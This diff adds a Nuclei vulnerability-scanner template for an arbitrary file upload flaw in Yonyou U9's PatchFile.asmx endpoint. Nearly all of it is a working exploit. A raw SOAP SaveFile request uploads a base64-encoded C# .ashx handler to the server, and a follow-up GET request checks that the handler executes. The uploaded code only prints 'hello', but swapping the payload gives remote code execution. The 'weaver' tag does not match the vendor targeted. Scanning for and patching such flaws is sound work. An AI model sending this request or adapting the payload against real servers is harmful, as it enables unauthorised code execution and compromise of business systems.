@@ -1,0 +1,49 @@
+id: yongyouOA-U9-PatchFile-asmx-file-upload
+info:
+  name: 用友U9 PatchFile.asmx接口存在任意文件上传漏洞
+  author: cnaq
+  severity: critical
+  description: 用友U9 PatchFile.asmx接口存在任意文件上传漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BU9-PatchFile.asmx%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: weaver,rce
+
+requests:
+  - raw:
+      - |
+        POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/SaveFile"
+        Content-Length: 880
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+          <SaveFile xmlns="http://tempuri.org/">
+            <binData>PCUgQCB3ZWJoYW5kbGVyIGxhbmd1YWdlPSJDIyIgY2xhc3M9IkF2ZXJhZ2VIYW5kbGVyIiAlPiAKdXNpbmcgU3lzdGVtOyAKdXNpbmcgU3lzdGVtLldlYjsgCgpwdWJsaWMgY2xhc3MgQXZlcmFnZUhhbmRsZXIgOiBJSHR0cEhhbmRsZXIgCnsgCiAgICBwdWJsaWMgYm9vbCBJc1JldXNhYmxlIAogICAgeyAKICAgICAgICBnZXQgewogICAgICAgICAgICAgcmV0dXJuIHRydWU7IAogICAgICAgICAgICB9IAogICAgICAgIH0gCiAgICAgICAgcHVibGljIHZvaWQgUHJvY2Vzc1JlcXVlc3QoSHR0cENvbnRleHQgY3R4KSAKICAgICAgICB7IAogICAgICAgICAgICBjdHguUmVzcG9uc2UuV3JpdGUoImhlbGxvIik7IAogICAgICAgIH0gCiAgICB9</binData>
+            <path>./</path>
+            <fileName>testtest3edc.ashx</fileName>
+          </SaveFile>
+          </soap:Body>
+        </soap:Envelope>
+
+      - |
+        GET /CS/Office/AutoUpdates/testtest3edc.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: regex
+        part: body
+        regex:
+          - 'hello'
